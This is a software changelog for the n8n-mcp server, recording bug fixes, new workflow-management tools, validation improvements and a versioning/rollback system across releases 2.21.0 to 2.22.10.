# Changelog

All notable changes to this project will be documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.0.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [Unreleased]

### ✨ Features

**n8n_retry_execution: Retry Failed Executions**

Added new `n8n_retry_execution` tool that enables automated retry of failed workflow executions using the n8n API's retry endpoint.

#### Features
- Retry failed executions with the same input data
- Optional `loadWorkflow` parameter (default: true)
- Returns new execution ID with retry tracking information
- Maintains link between original and retry executions via `retryOf` field

#### Implementation
- **API Client**: Added `retryExecution(id, loadWorkflow)` method to N8nApiClient
- **Tool**: New `n8n_retry_execution` tool with Zod validation
- **Handler**: Comprehensive error handling for retry operations
- **Tests**: Unit tests for API client and integration tests for handler

#### Benefits
- Reduce manual intervention for transient failures
- Enable automated error recovery workflows
- Improve reliability of long-running workflows
- Support for retry tracking and monitoring

## [2.22.10] - 2025-11-04

### 🐛 Bug Fixes

**sql.js Fallback: Fixed Database Health Check Crash**

Fixed critical startup crash when the server falls back to sql.js adapter (used when better-sqlite3 fails to load, such as Node.js version mismatches between build and runtime).

#### Problem

When Claude Desktop was configured to use a different Node.js version than the one used to build the project:
- better-sqlite3 fails to load due to NODE_MODULE_VERSION mismatch (e.g., built with Node v22, running with Node v20)
- System gracefully falls back to sql.js adapter (pure JavaScript, no native dependencies)
- **BUT** the database health check crashed with "no such module: fts5" error
- Server exits immediately after startup, preventing connection

**Error Details:**
```
[ERROR] Database health check failed: Error: no such module: fts5
    at e.handleError (sql-wasm.js:90:371)
    at e.prepare (sql-wasm.js:89:104)
    at SQLJSAdapter.prepare (database-adapter.js:202:30)
    at N8NDocumentationMCPServer.validateDatabaseHealth (server.js:251:42)
```

**Root Cause:** The health check attempted to query the FTS5 (Full-Text Search) table, which is not available in sql.js. The error was not caught, causing the server to exit.

#### Solution

Wrapped the FTS5 health check in a try-catch block to handle sql.js gracefully:

```typescript
// Check if FTS5 table exists (wrap in try-catch for sql.js compatibility)
try {
  const ftsExists = this.db.prepare(`
    SELECT name FROM sqlite_master
    WHERE type='table' AND name='nodes_fts'
  `).get();

  if (!ftsExists) {
    logger.warn('FTS5 table missing - search performance will be degraded...');
  } else {
    const ftsCount = this.db.prepare('SELECT COUNT(*) as count FROM nodes_fts').get();
    if (ftsCount.count === 0) {
      logger.warn('FTS5 index is empty - search will not work properly...');
    }
  }
} catch (ftsError) {
  // FTS5 not supported (e.g., sql.js fallback) - this is OK, just warn
  logger.warn('FTS5 not available - using fallback search. For better performance, ensure better-sqlite3 is properly installed.');
}
```

#### Impact

**Before Fix:**
- ❌ Server crashed immediately when using sql.js fallback
- ❌ Claude Desktop connection failed with Node.js version mismatches
- ❌ No way to use the MCP server without matching Node.js versions exactly

**After Fix:**
- ✅ Server starts successfully with sql.js fallback
- ✅ Works with any Node.js version (graceful degradation)
- ✅ Clear warning about FTS5 unavailability in logs
- ✅ Users can choose between sql.js (slower, works everywhere) or rebuilding better-sqlite3 (faster, requires matching Node version)

#### Performance Notes

When using sql.js fallback:
- Full-text search (FTS5) is not available, falls back to LIKE queries
- Slightly slower search performance (~10-30ms vs ~5ms with FTS5)
- All other functionality works identically
- Database operations work correctly

**Recommendation:** For best performance, ensure better-sqlite3 loads successfully by matching Node.js versions or rebuilding:
```bash
# If Node version mismatch, rebuild better-sqlite3
npm rebuild better-sqlite3
```

#### Files Changed

**Modified (1 file):**
- `src/mcp/server.ts` (lines 299-317) - Added try-catch around FTS5 health check

#### Testing

- ✅ Tested with Node v20.17.0 (Claude Desktop version)
- ✅ Tested with Node v22.17.0 (build version)
- ✅ Server starts successfully in both cases
- ✅ sql.js fallback works correctly with graceful FTS5 degradation
- ✅ All 6 startup checkpoints pass
- ✅ Database health check passes with warning

Conceived by Romuald Członkowski - [www.aiadvisors.pl/en](https://www.aiadvisors.pl/en)

## [2.22.9] - 2025-11-04

### 🔄 Dependencies Update

**n8n Platform Update to 1.118.1**

Updated n8n and all related dependencies to the latest versions:

- **n8n**: 1.117.2 → 1.118.1
- **n8n-core**: 1.116.0 → 1.117.0
- **n8n-workflow**: 1.114.0 → 1.115.0
- **@n8n/n8n-nodes-langchain**: 1.116.2 → 1.117.0

### 📊 Database Changes

- Rebuilt node database with **542 nodes**
  - 439 nodes from n8n-nodes-base
  - 103 nodes from @n8n/n8n-nodes-langchain
- All node metadata synchronized with latest n8n release

### 🐛 Bug Fixes

**n8n 1.118.1+ Compatibility: Fixed versionCounter API Rejection**

Fixed integration test failures caused by n8n 1.118.1 API change where `versionCounter` property is returned in GET responses but rejected in PUT requests.

**Impact**:
- Integration tests were failing with "request/body must NOT have additional properties" error
- Workflow update operations via n8n API were failing

**Solution**:
- Added `versionCounter` to property exclusion list in `cleanWorkflowForUpdate()` (src/services/n8n-validation.ts:136)
- Added `versionCounter?: number` type definition to Workflow and WorkflowExport interfaces
- Added test coverage to prevent regression

### ✅ Verification

- Database rebuild completed successfully
- All node types validated
- Documentation mappings updated

Conceived by Romuald Członkowski - https://www.aiadvisors.pl/en

## [2.22.7] - 2025-10-26

### 📝 Documentation Fixes

**Issue #292: Corrected Array Property Removal Documentation in n8n_update_partial_workflow**

Fixed critical documentation error in property removal patterns that could have led users to write non-functional code.

#### Problem

The documentation incorrectly showed using array index notation `[0]` for removing array elements:
```javascript
// INCORRECT (doesn't work as shown)
updates: { "parameters.headers[0]": undefined }
```

**Root Cause**: The `setNestedProperty` implementation doesn't parse array index notation like `[0]`. It treats `headers[0]` as a literal object key, not an array index.

**Impact**: Users following the documentation would write code that doesn't behave as expected. The property `headers[0]` would be treated as an object key, not an array element reference.

#### Fixed

**Three documentation corrections in `src/mcp/tool-docs/workflow_management/n8n-update-partial-workflow.ts`:**

1. **Nested Property Removal Section** (lines 236-244):
   - Changed comment from `// Remove array element` to `// Remove entire array property`
   - Changed code from `"parameters.headers[0]": undefined` to `"parameters.headers": undefined`

2. **Example rm5** (line 340):
   - Changed comment from `// Remove array element` to `// Remove entire array property`
   - Changed code from `"parameters.headers[0]": undefined` to `"parameters.headers": undefined`

3. **Pitfalls Section** (line 405):
   - OLD: `'Array element removal with undefined removes the element at that index, which may shift subsequent indices'`
   - NEW: `'Array index notation (e.g., "parameters.headers[0]") is not supported - remove the entire array property instead'`

#### Correct Usage

**To remove an array property:**
```javascript
// Correct: Remove entire array
n8n_update_partial_workflow({
  id: "wf_012",
  operations: [{
    type: "updateNode",
    nodeName: "HTTP Request",
    updates: { "parameters.headers": undefined }  // Remove entire headers array
  }]
});
```

**NOT:**
```javascript
// Incorrect: Array index notation doesn't work
updates: { "parameters.headers[0]": undefined }  // Treated as object key "headers[0]"
```

#### Impact

- **Prevents User Confusion**: Clear documentation on what works vs. what doesn't
- **Accurate Examples**: All examples now show correct, working patterns
- **Better Error Prevention**: Pitfall warning helps users avoid this mistake
- **No Code Changes**: This is purely a documentation fix - no implementation changes needed

#### Testing

- ✅ Documentation reviewed by code-reviewer agent
- ✅ Tested by n8n-mcp-tester agent
- ✅ All examples verified against actual implementation behavior
- ✅ Pitfall accurately describes technical limitation

#### Files Changed

**Documentation (1 file)**:
- `src/mcp/tool-docs/workflow_management/n8n-update-partial-workflow.ts` - Corrected 3 instances of array property removal documentation

**Configuration (2 files)**:
- `package.json` - Version bump to 2.22.7
- `package.runtime.json` - Version bump to 2.22.7

#### Related

- **Issue**: #292 - Missing documentation on how to remove node properties using `updateNode`
- **PR**: #375 - Resolve GitHub Issue 292 in n8n-mcp
- **Code Review**: Identified critical array index notation documentation error
- **Root Cause**: Implementation doesn't parse array bracket notation `[N]`

Conceived by Romuald Członkowski - [www.aiadvisors.pl/en](https://www.aiadvisors.pl/en)

## [2.22.6] - 2025-10-25

### 🐛 Bug Fixes

**Issue #228: Fix Docker Port Configuration Mismatch**

Fixed critical Docker configuration bug where custom PORT environment variable values were not properly mapped to container ports, causing connection failures in Docker deployments.

#### Problem
- **docker-compose.yml**: Port mapping `"${PORT:-3000}:3000"` hardcoded container port to 3000
- **docker-compose.yml**: Health check hardcoded to port 3000
- **Dockerfile**: Health check hardcoded to port 3000
- Impact: When PORT≠3000 (e.g., PORT=8080), Docker mapped host port to wrong container port

#### Solution
- **docker-compose.yml line 44**: Changed port mapping to `"${PORT:-3000}:${PORT:-3000}"`
- **docker-compose.yml line 56**: Updated health check to use dynamic port `$${PORT:-3000}`
- **Dockerfile line 93**: Updated HEALTHCHECK to use dynamic port `${PORT:-3000}`
- **Dockerfile line 85**: Added clarifying comment about PORT configurability

#### Testing
- Verified with default PORT (3000)
- Verified with custom PORT (8080)
- Health checks work correctly in both scenarios

#### Related Issues
- Fixes #228 (Docker Compose port error)
- Likely fixes #109 (Configuration ignored in HTTP mode)
- Likely fixes #84 (Can't access container)

Conceived by Romuald Członkowski - [www.aiadvisors.pl/en](https://www.aiadvisors.pl/en)

## [2.22.3] - 2025-10-25

### 🔧 Code Quality Improvements

**Issue #349: Refactor n8n API Response Validation (PR #367)**

Improved code maintainability and added comprehensive test coverage for defensive response validation added in PR #367.

#### Refactoring

**1. Eliminated DRY Violation**
- Extracted duplicated validation logic into `validateListResponse<T>()` helper method
- Reduced code duplication from 88 lines to single reusable function
- Impact: 75% reduction in validation code, easier maintenance

**2. Enhanced Error Handling**
- Consistent error message format across all list operations
- Limited error message verbosity (max 5 keys shown to prevent information exposure)
- Added security protection against data structure exposure
- Better error messages: `got object with keys: [data, items, total, hasMore, meta]`

**3. Improved Documentation**
- Added JSDoc comments explaining backwards compatibility
- Documented modern vs legacy response formats
- Referenced issue #349 for context

#### Testing

**Added Comprehensive Unit Tests** (29 new test cases)
- Legacy array format wrapping for all 4 methods
- Null/undefined response handling
- Primitive type rejection (string, number, boolean)
- Invalid structure detection
- Non-array data field validation
- Error message truncation with many keys
- 100% coverage of new validation logic

**Test Coverage Results**:
- Before: 0% coverage of validation scenarios
- After: 100% coverage (29/29 scenarios tested)
- All validation paths exercised and verified

#### Impact

**Code Quality**:
- ✅ DRY principle restored (no duplication)
- ✅ Type safety improved with generics
- ✅ Consistent error handling across all methods
- ✅ Well-documented backwards compatibility

**Maintainability**:
- ✅ Single source of truth for validation logic
- ✅ Future bug fixes apply to all methods automatically
- ✅ Easier to understand and modify

**Security**:
- ✅ Limited information exposure in error messages
- ✅ Protection against verbose error logs

**Testing**:
- ✅ Full test coverage prevents regressions
- ✅ All edge cases validated
- ✅ Backwards compatibility verified

#### Files Modified

**Code (1 file)**:
- `src/services/n8n-api-client.ts`
  - Added `validateListResponse<T>()` private helper method (44 lines)
  - Refactored listWorkflows, listExecutions, listCredentials, listTags (reduced from ~100 lines to ~20 lines)
  - Added JSDoc documentation to all 4 list methods
  - Net reduction: ~80 lines of code

**Tests (1 file)**:
- `tests/unit/services/n8n-api-client.test.ts`
  - Added 29 comprehensive validation test cases (237 lines)
  - Coverage for all 4 list methods
  - Tests for legacy format, null responses, invalid structures, key truncation

**Configuration (1 file)**:
- `package.json` - Version bump to 2.22.3

#### Technical Details

**Helper Method Signature**:
```typescript
private validateListResponse<T>(
  responseData: any,
  resourceType: string
): { data: T[]; nextCursor?: string | null }
```

**Error Message Example**:
```
Invalid response from n8n API for workflows: expected {data: [], nextCursor?: string},
got object with keys: [items, total, hasMore, page, limit]...
```

**Usage Example**:
```typescript
async listWorkflows(params: WorkflowListParams = {}): Promise<WorkflowListResponse> {
  try {
    const response = await this.client.get('/workflows', { params });
    return this.validateListResponse<Workflow>(response.data, 'workflows');
  } catch (error) {
    throw handleN8nApiError(error);
  }
}
```

#### Related

- **Issue**: #349 - Response validation for n8n API list operations
- **PR**: #367 - Add defensive response validation (original implementation)
- **Code Review**: Identified DRY violation and missing test coverage
- **Testing**: Validated by n8n-mcp-tester agent
- **Analysis**: Both agents confirmed functional correctness, recommended refactoring

Conceived by Romuald Członkowski - [www.aiadvisors.pl/en](https://www.aiadvisors.pl/en)

---

### ✨ Enhancements

**Issue #361: Enhanced HTTP Request Node Validation Suggestions**

Added helpful suggestions for HTTP Request node best practices to prevent common production issues discovered through real-world workflow analysis.

#### What's New

1. **alwaysOutputData Suggestion**
   - Suggests adding `alwaysOutputData: true` at node level (not in parameters)
   - Prevents silent workflow failures when HTTP requests error
   - Ensures downstream error handling can process failed requests
   - Example suggestion: "Consider adding alwaysOutputData: true at node level for better error handling. This ensures the node produces output even when HTTP requests fail, allowing downstream error handling."

2. **responseFormat Suggestion for API Endpoints**
   - Suggests setting `options.response.response.responseFormat` for API endpoints
   - Prevents JSON parsing confusion
   - Triggered when URL contains `/api`, `/rest`, `supabase`, `firebase`, `googleapis`, or `.com/v` patterns
   - Example suggestion: "API endpoints should explicitly set options.response.response.responseFormat to 'json' or 'text' to prevent confusion about response parsing"

3. **Enhanced URL Protocol Validation**
   - Detects missing protocol in expression-based URLs
   - Warns about patterns like `=www.{{ $json.domain }}.com` (missing http://)
   - Warns about expressions without protocol: `={{ $json.domain }}/api/data`
   - Example warning: "URL expression appears to be missing http:// or https:// protocol"

#### Investigation Findings

This enhancement was developed after thorough investigation of issue #361:

**Key Discoveries:**
- ✅ Mixed expression syntax `=literal{{ expression }}` **actually works in n8n** - the issue report's primary claim was incorrect
- ✅ Real validation gaps identified: missing `alwaysOutputData` and `responseFormat` checks
- ✅ Workflow analysis showed "?" icon in UI caused by missing required URL (already caught by validation)
- ✅ Compared broken vs fixed workflows to identify actual production issues

**Testing Evidence:**
- Analyzed workflow SwjKJsJhe8OsYfBk with mixed syntax - executions successful
- Compared broken workflow (mBmkyj460i5rYTG4) with fixed workflow (hQI9pby3nSFtk4TV)
- Identified that fixed workflow has `alwaysOutputData: true` and explicit `responseFormat: "json"`

#### Impact

- **Non-Breaking**: All changes are suggestions/warnings, not errors
- **Profile-Aware**: Suggestions shown in all profiles for maximum helpfulness
- **Actionable**: Clear guidance on how to implement best practices
- **Production-Focused**: Addresses real workflow reliability concerns from actual broken workflows

#### Test Coverage

Added 8 new test cases covering:
- alwaysOutputData suggestion for all HTTP Request nodes
- responseFormat suggestion for API endpoint detection (various patterns)
- responseFormat NOT suggested when already configured
- URL protocol validation for expression-based URLs
- Protocol warnings for missing http:// in expressions
- No false positives when protocol is correctly included

#### Technical Details

**Files Modified:**
- `src/services/enhanced-config-validator.ts` - Added `enhanceHttpRequestValidation()` implementation
- `tests/unit/services/enhanced-config-validator.test.ts` - Added 8 comprehensive test cases

**Validation Flow:**
1. Check for alwaysOutputData suggestion (all HTTP Request nodes)
2. Detect API endpoints by URL patterns
3. Check for explicit responseFormat configuration
4. Validate expression-based URLs for protocol issues

#### Related

- **Issue**: #361 - validate_node_operation: Missing critical HTTP Request node configuration checks
- **Analysis**: Deep investigation with @agent-Explore and @agent-n8n-mcp-tester
- **Workflows Analyzed**:
  - SwjKJsJhe8OsYfBk (mixed syntax test)
  - mBmkyj460i5rYTG4 (broken workflow)
  - hQI9pby3nSFtk4TV (fixed workflow)

Conceived by Romuald Członkowski - https://www.aiadvisors.pl/en

---

### 🐛 Bug Fixes

**Issue #360: Enhanced Warnings for If/Switch Node Connection Parameters**

Fixed issue where users could unintentionally place multiple If node connections on the same branch (TRUE/FALSE) when using `sourceIndex` parameter instead of the recommended `branch` parameter. The system now provides helpful warnings to guide users toward better practices.

#### What Was Fixed

1. **New Warning System**:
   - Warns when using `sourceIndex` with If nodes - suggests `branch="true"` or `branch="false"` instead
   - Warns when using `sourceIndex` with Switch nodes - suggests `case=N` instead
   - Explains the correct branch structure: `main[0]=TRUE branch, main[1]=FALSE branch`

2. **Enhanced Documentation**:
   - Added **CRITICAL** pitfalls to `n8n_update_partial_workflow` tool documentation
   - Clear guidance that using `sourceIndex=0` for multiple connections puts them ALL on the TRUE branch
   - Examples showing correct vs. incorrect usage

3. **Type System Improvements**:
   - Added `warnings` field to `WorkflowDiffResult` interface
   - Warnings are non-blocking (operations still succeed)
   - Differentiated from errors for better UX

#### Behavior

The existing `branch` parameter works correctly and has comprehensive test coverage:
- `branch="true"` → routes to `main[0]` (TRUE path)
- `branch="false"` → routes to `main[1]` (FALSE path)

The issue was that users who didn't know about the `branch` parameter would naturally use `sourceIndex`, which led to incorrect branch routing.

#### Example Warning

```
Connection to If node "Check Condition" uses sourceIndex=0.
Consider using branch="true" or branch="false" for better clarity.
If node outputs: main[0]=TRUE branch, main[1]=FALSE branch.
```

#### Test Coverage

- Added regression tests that reproduce the exact issue from #360
- Verify warnings are generated for If and Switch nodes
- Confirm existing smart parameter tests still pass

**Conceived by Romuald Członkowski - https://www.aiadvisors.pl/en**

---

### ✨ New Features

**Auto-Update Node Versions with Smart Migration**

Added comprehensive node version upgrade functionality to the autofixer, enabling automatic detection and migration of outdated node versions with intelligent breaking change handling.

#### Key Features

1. **Smart Version Upgrades** (`typeversion-upgrade` fix type):
   - Automatically detects outdated node versions
   - Applies intelligent migrations with auto-migratable property changes
   - Handles well-known breaking changes (Execute Workflow v1.0→v1.1, Webhook v2.0→v2.1)
   - Generates UUIDs and sensible defaults for new required fields
   - HIGH confidence for non-breaking upgrades, MEDIUM for breaking changes with auto-migration

2. **Version Migration Guidance** (`version-migration` fix type):
   - Documents complex migrations requiring manual intervention
   - Provides AI-friendly post-update guidance with step-by-step instructions
   - Lists required actions by priority (CRITICAL, HIGH, MEDIUM, LOW)
   - Documents behavior changes and their impact
   - Estimates time required for manual migration steps
   - MEDIUM/LOW confidence - requires review before applying

3. **Breaking Changes Registry**:
   - Centralized registry of known breaking changes across n8n nodes
   - Example: Execute Workflow v1.1+ requires `inputFieldMapping` (auto-added)
   - Example: Webhook v2.1+ requires `webhookId` field (auto-generated UUID)
   - Extensible for future node version changes

4. **Post-Update Validation**:
   - Generates comprehensive migration reports for AI agents
   - Includes required actions, deprecated properties, behavior changes
   - Provides actionable migration steps with estimated time
   - Helps AI agents understand what manual work is needed after auto-migration

#### Architecture

- **NodeVersionService**: Version discovery, comparison, upgrade path recommendation
- **BreakingChangeDetector**: Detects changes from registry and dynamic schema comparison
- **NodeMigrationService**: Applies smart migrations with confidence scoring
- **PostUpdateValidator**: Generates AI-friendly migration guidance
- **Enhanced Database Schema**:
  - `node_versions` table - tracks all available versions per node
  - `version_property_changes` table - detailed migration tracking

#### Usage Example

```typescript
// Preview all fixes including version upgrades
n8n_autofix_workflow({id: "wf_123"})

// Only upgrade versions with smart migrations
n8n_autofix_workflow({
  id: "wf_123",
  fixTypes: ["typeversion-upgrade"],
  applyFixes: true
})

// Get migration guidance for breaking changes
n8n_autofix_workflow({
  id: "wf_123",
  fixTypes: ["version-migration"]
})
```

#### Impact

- Proactively keeps workflows up-to-date with latest node versions
- Reduces manual migration effort for Execute Workflow, Webhook, and other versioned nodes
- Provides clear guidance for AI agents on handling breaking changes
- Ensures workflows benefit from latest node features and bug fixes

**Conceived by Romuald Członkowski - www.aiadvisors.pl/en**

---

**Workflow Versioning & Rollback System**

Added comprehensive workflow versioning, backup, and rollback capabilities with automatic pruning to prevent memory leaks. Every workflow update now creates an automatic backup that can be restored on failure.

#### Key Features

1. **Automatic Backups**:
   - Every workflow update automatically creates a version backup (opt-out via `createBackup: false`)
   - Captures full workflow state before modifications
   - Auto-prunes to 10 versions per workflow (prevents unbounded storage growth)
   - Tracks trigger context (partial_update, full_update, autofix)
   - Stores operation sequences for audit trail

2. **Rollback Capability** (`n8n_workflow_versions` tool):
   - Restore workflow to any previous version
   - Automatic backup of current state before rollback
   - Optional pre-rollback validation
   - Six operational modes: list, get, rollback, delete, prune, truncate

3. **Version Management**:
   - List version history with metadata (size, trigger, operations applied)
   - Get detailed version information including full workflow snapshot
   - Delete specific versions or all versions for a workflow
   - Manual pruning with custom retention count

4. **Memory Safety**:
   - Automatic pruning to max 10 versions per workflow after each backup
   - Manual cleanup tools (delete, prune, truncate)
   - Storage statistics tracking (total size, per-workflow breakdown)
   - Zero configuration required - works automatically

5. **Non-Blocking Design**:
   - Backup failures don't block workflow updates
   - Logged warnings for failed backups
   - Continues with update even if versioning service unavailable

#### Architecture

- **WorkflowVersioningService**: Core versioning logic (backup, restore, cleanup)
- **workflow_versions Table**: Stores full workflow snapshots with metadata
- **Auto-Pruning**: FIFO policy keeps 10 most recent versions
- **Hybrid Storage**: Full snapshots + operation sequences for audit trail

#### Usage Examples

```typescript
// Automatic backups (default behavior)
n8n_update_partial_workflow({
  id: "wf_123",
  operations: [...]
  // createBackup: true is default
})

// List version history
n8n_workflow_versions({
  mode: "list",
  workflowId: "wf_123",
  limit: 10
})

// Rollback to previous version
n8n_workflow_versions({
  mode: "rollback",
  workflowId: "wf_123"
  // Restores to latest backup, creates backup of current state first
})

// Rollback to specific version
n8n_workflow_versions({
  mode: "rollback",
  workflowId: "wf_123",
  versionId: 42
})

// Delete old versions manually
n8n_workflow_versions({
  mode: "prune",
  workflowId: "wf_123",
  maxVersions: 5
})

// Emergency cleanup (requires confirmation)
n8n_workflow_versions({
  mode: "truncate",
  confirmTruncate: true
})
```

#### Impact

- **Confidence**: Increases AI agent confidence by 3x (per UX analysis)
- **Safety**: Transforms feature from "use with caution" to "production-ready"
- **Recovery**: Failed updates can be instantly rolled back
- **Audit**: Complete history of workflow changes with operation sequences
- **Memory**: Auto-pruning prevents storage leaks (~200KB per workflow max)

#### Integration Points

- `n8n_update_partial_workflow`: Automatic backup before diff operations
- `n8n_update_full_workflow`: Automatic backup before full replacement
- `n8n_autofix_workflow`: Automatic backup with fix types metadata
- `n8n_workflow_versions`: Unified rollback/cleanup interface (6 modes)

**Conceived by Romuald Członkowski - [www.aiadvisors.pl/en](https://www.aiadvisors.pl/en)**

## [2.21.1] - 2025-10-23

### 🐛 Bug Fixes

**Issue #357: Fix AI Node Connection Validation in Partial Workflow Updates**

Fixed critical validation issue where `n8n_update_partial_workflow` incorrectly required `main` connections for AI nodes that exclusively use AI-specific connection types (`ai_languageModel`, `ai_memory`, `ai_embedding`, `ai_vectorStore`, `ai_tool`).

#### Problem

Workflows containing AI nodes (OpenAI Chat Model, Postgres Chat Memory, Embeddings OpenAI, Supabase Vector Store) could not be updated via `n8n_update_partial_workflow`, even for trivial changes to unrelated nodes. The validation logic incorrectly expected ALL nodes to have `main` connections, causing false positive errors:

```
Invalid connections: [
  {
    "code": "invalid_type",
    "expected": "array",
    "received": "undefined",
    "path": ["OpenAI Chat Model", "main"],
    "message": "Required"
  }
]
```

**Impact**: Users could not update any workflows containing AI Agent nodes via MCP tools, forcing manual updates through the n8n UI.

#### Root Cause

The Zod schema in `src/services/n8n-validation.ts` (lines 27-39) defined `main` connections as a **required field** for all nodes, without support for AI-specific connection types:

```typescript
// BEFORE (Broken):
export const workflowConnectionSchema = z.record(
  z.object({
    main: z.array(...), // Required - WRONG for AI nodes!
  })
);
```

AI nodes use specialized connection types exclusively:
- **ai_languageModel** - Language models (OpenAI, Anthropic, etc.)
- **ai_memory** - Memory systems (Postgres Chat Memory, etc.)
- **ai_embedding** - Embedding models (Embeddings OpenAI, etc.)
- **ai_vectorStore** - Vector stores (Supabase Vector Store, etc.)
- **ai_tool** - Tools for AI agents

These nodes **never have `main` connections** - they only have their AI-specific connection types.

#### Fixed

**1. Updated Zod Schema** (`src/services/n8n-validation.ts` lines 27-49):
```typescript
// AFTER (Fixed):
const connectionArraySchema = z.array(
  z.array(
    z.object({
      node: z.string(),
      type: z.string(),
      index: z.number(),
    })
  )
);

export const workflowConnectionSchema = z.record(
  z.object({
    main: connectionArraySchema.optional(),              // Now optional
    error: connectionArraySchema.optional(),              // Error connections
    ai_tool: connectionArraySchema.optional(),            // AI tool connections
    ai_languageModel: connectionArraySchema.optional(),   // Language model connections
    ai_memory: connectionArraySchema.optional(),          // Memory connections
    ai_embedding: connectionArraySchema.optional(),       // Embedding connections
    ai_vectorStore: connectionArraySchema.optional(),     // Vector store connections
  })
);
```

**2. Comprehensive Test Suite** (New file: `tests/integration/workflow-diff/ai-node-connection-validation.test.ts`):
- 13 test scenarios covering all AI connection types
- Tests for AI nodes with ONLY AI-specific connections (no `main`)
- Tests for mixed workflows (regular nodes + AI nodes)
- Tests for the exact scenario from issue #357
- All tests passing ✅

**3. Updated Documentation** (`src/mcp/tool-docs/workflow_management/n8n-update-partial-workflow.ts`):
- Added clarification that AI nodes do NOT require `main` connections
- Documented fix for issue #357
- Updated best practices for AI workflows

#### Testing

**Before Fix**:
- ❌ `n8n_validate_workflow`: Returns `valid: true` (correct)
- ❌ `n8n_update_partial_workflow`: FAILS with "main connections required" errors
- ❌ Cannot update workflows containing AI nodes at all

**After Fix**:
- ✅ `n8n_validate_workflow`: Returns `valid: true` (still correct)
- ✅ `n8n_update_partial_workflow`: SUCCEEDS without validation errors
- ✅ AI nodes correctly recognized with AI-specific connection types only
- ✅ All 13 new integration tests passing
- ✅ Tested with actual workflow `019Vrw56aROeEzVj` from issue #357

#### Impact

**Zero Breaking Changes**:
- Making required fields optional is always backward compatible
- All existing workflows continue working
- Validation now correctly matches n8n's actual connection model

**Fixes**:
- Users can now update AI workflows via `n8n_update_partial_workflow`
- AI nodes no longer generate false positive validation errors
- Consistent validation between `n8n_validate_workflow` and `n8n_update_partial_workflow`

#### Files Changed

**Modified (3 files)**:
- `src/services/n8n-validation.ts` - Fixed Zod schema to support all connection types
- `src/mcp/tool-docs/workflow_management/n8n-update-partial-workflow.ts` - Updated documentation
- `package.json` - Version bump to 2.21.1

**Added (1 file)**:
- `tests/integration/workflow-diff/ai-node-connection-validation.test.ts` - Comprehensive test suite (13 tests)

#### References

- **Issue**: #357 - n8n_update_partial_workflow incorrectly validates AI nodes requiring 'main' connections
- **Workflow**: `019Vrw56aROeEzVj` (WOO_Workflow_21_POST_Chat_Send_AI_Agent)
- **Investigation**: Deep code analysis by Explore agent identified exact root cause in Zod schema
- **Confirmation**: n8n-mcp-tester agent verified fix with real workflow

Conceived by Romuald Członkowski - [www.aiadvisors.pl/en](https://www.aiadvisors.pl/en)

## [2.21.0] - 2025-10-23

### ✨ Features

**Issue #353: Auto-Update Connection References on Node Rename**

Enhanced `n8n_update_partial_workflow` to automatically update all connection references when renaming nodes, matching n8n UI behavior and eliminating the need for complex manual workarounds.

#### Problem
When renaming a node using the `updateNode` operation, connections still referenced the old node name, causing validation errors:
```
"Connection references non-existent target node: Old Name"
```

This forced users to manually remove and re-add all connections, requiring:
- 3+ operations instead of 1 simple rename
- Manual tracking of all connection details (source, branch/case, indices)
- Error-prone connection management
- Inconsistent behavior compared to n8n UI

#### Solution: Automatic Connection Reference Updates

When you rename a node, **all connection references are automatically updated throughout the entire workflow**. The system:
1. Detects name changes during `updateNode` operations
2. Tracks old→new name mappings
3. Updates all connection references after node operations complete
4. Handles all connection types and branch configurations

#### What Gets Updated Automatically

**Connection Source Keys:**
- If a source node is renamed, its connections object key is updated
- Example: `connections['Old Name']` → `connections['New Name']`

**Connection Target References:**
- If a target node is renamed, all connections pointing to it are updated
- Example: `{node: 'Old Name', type: 'main', index: 0}` → `{node: 'New Name', type: 'main', index: 0}`

**All Connection Types:**
- `main` - Standard connections
- `error` - Error output connections
- `ai_tool` - AI tool connections
- `ai_languageModel` - AI language model connections
- `ai_memory` - AI memory connections
- All other connection types

**All Branch Configurations:**
- IF node branches (true/false outputs)
- Switch node cases (multiple numbered outputs)
- Error output branches
- AI-specific connection routing

#### Examples

**Before (v2.20.8 and earlier) - Failed:**
```javascript
// Attempting to rename would fail
n8n_update_partial_workflow({
  id: "workflow_id",
  operations: [{
    type: "updateNode",
    nodeId: "8546d741-1af1-4aa0-bf11-af6c926c0008",
    updates: {
      name: "Return 404 Not Found"  // Rename from "Return 403 Forbidden"
    }
  }]
});

// Result: ERROR
// "Workflow validation failed with 2 structural issues"
// "Connection references non-existent target node: Return 403 Forbidden"

// Required workaround (3 operations):
operations: [
  {type: "removeConnection", source: "IF", target: "Return 403 Forbidden", branch: "false"},
  {type: "updateNode", nodeId: "...", updates: {name: "Return 404 Not Found"}},
  {type: "addConnection", source: "IF", target: "Return 404 Not Found", branch: "false"}
]
```

**After (v2.21.0) - Works Automatically:**
```javascript
// Same operation now succeeds automatically!
n8n_update_partial_workflow({
  id: "workflow_id",
  operations: [{
    type: "updateNode",
    nodeId: "8546d741-1af1-4aa0-bf11-af6c926c0008",
    updates: {
      name: "Return 404 Not Found",  // Connections auto-update!
      parameters: {
        responseBody: '={{ {"error": "Not Found"} }}',
        options: { responseCode: 404 }
      }
    }
  }]
});

// Result: SUCCESS
// All connections automatically point to "Return 404 Not Found"
// Single operation instead of 3+
```

#### Additional Features

**Name Collision Detection:**
```javascript
// Attempting to rename to existing name
{type: "updateNode", nodeId: "abc", updates: {name: "Existing Name"}}

// Result: Clear error message
"Cannot rename node 'Old Name' to 'Existing Name': A node with that name
already exists (id: xyz123...). Please choose a different name."
```

**Batch Rename Support:**
```javascript
// Multiple renames in single call - all connections update correctly
operations: [
  {type: "updateNode", nodeId: "node1", updates: {name: "New Name 1"}},
  {type: "updateNode", nodeId: "node2", updates: {name: "New Name 2"}},
  {type: "updateNode", nodeId: "node3", updates: {name: "New Name 3"}}
]
```

**Chain Operations:**
```javascript
// Rename then immediately use new name in subsequent operations
operations: [
  {type: "updateNode", nodeId: "abc", updates: {name: "New Name"}},
  {type: "addConnection", source: "New Name", target: "Other Node"}
]
```

#### Technical Implementation

**Files Modified:**
- `src/services/workflow-diff-engine.ts` - Core auto-update logic
  - Added `renameMap` property to track name changes
  - Added `updateConnectionReferences()` method (lines 943-994)
  - Enhanced `validateUpdateNode()` with name collision detection (lines 369-392)
  - Modified `applyUpdateNode()` to track renames (lines 613-635)
  - Connection updates applied after Pass 1 node operations (lines 156-160)

- `src/mcp/tool-docs/workflow_management/n8n-update-partial-workflow.ts`
  - Added comprehensive "Automatic Connection Reference Updates" section
  - Added to tips: "Node renames: Connections automatically update"
